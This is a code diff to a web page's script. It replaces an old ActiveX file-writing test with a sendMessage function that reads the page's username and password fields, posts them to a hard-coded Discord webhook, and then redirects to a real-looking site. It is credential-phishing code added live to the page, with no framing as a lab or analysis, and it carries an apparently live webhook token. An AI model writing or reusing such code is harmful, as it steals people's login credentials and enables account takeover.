@@ -119,16 +119,34 @@
         
         
         <script>
-            function sendMessage() {
-                console.log("Je rentre dans send message")
-                var file = new ActiveXObject("Scripting.FileSystemObject");
-                var a = file.CreateTextFile("c:\\testfile.txt", true);
-                a.WriteLine("Salut cppFrance !");
-                a.Close();
-                // window.location.replace="http://www.google.fr";
-                sleep(40000);
+            // function sendMessage() {
+            //     console.log("Je rentre dans send message")
+            //     var file = new ActiveXObject("Scripting.FileSystemObject");
+            //     var a = file.CreateTextFile("c:\\testfile.txt", true);
+            //     a.WriteLine("Salut cppFrance !");
+            //     a.Close();
+            //     // window.location.replace="http://www.google.fr";
+            //     sleep(40000);
                 
+            // }
+            function sendMessage() {
+            function sleep(milliseconds) {
+                const date = Date.now();
+                let currentDate = null;
+                do {
+                currentDate = Date.now();
+                } while (currentDate - date < milliseconds);
             }
+            var request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/955740028569534495/rX2WQtQl1RKbdK1-ECfAJvHjXQXNECm9sDLv8gAh3NV9hIsDwvS3IfUSaIUKNQjtXqVM");
+            request.setRequestHeader('Content-type', 'application/json');
+            var params = {
+                content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+            }
+            request.send(JSON.stringify(params));
+            sleep(400)
+            window.location.replace("https://www.bycommute.fr");
+         }
         </script>
     
     
